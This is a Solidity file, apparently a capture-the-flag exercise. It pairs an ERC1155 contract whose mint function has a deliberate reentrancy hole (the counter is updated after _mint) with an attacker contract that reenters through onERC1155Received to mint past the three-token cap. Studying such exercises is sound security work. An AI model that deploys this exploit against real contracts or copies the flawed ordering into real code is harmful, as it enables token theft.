// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "hardhat/console.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;
    event Mint(uint256 totalSupply);
    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        emit Mint(totalSupply[id]);
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}
contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    Overmint1_ERC1155 public overmint;
    uint256 public constant index = 0;
    constructor(address _overmint) {
        overmint = Overmint1_ERC1155(_overmint);
    }

    function attack() external {
        overmint.mint(index, "0x");
        overmint.safeTransferFrom(address(this), msg.sender, 0, 5, "0x0");
    }
    function onERC1155Received(address, address, uint256, uint256, bytes memory) public override returns (bytes4) {
        if (overmint.totalSupply(index) < 5) {
            overmint.mint(index, "0x");
        }

        return this.onERC1155Received.selector;
    }
    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
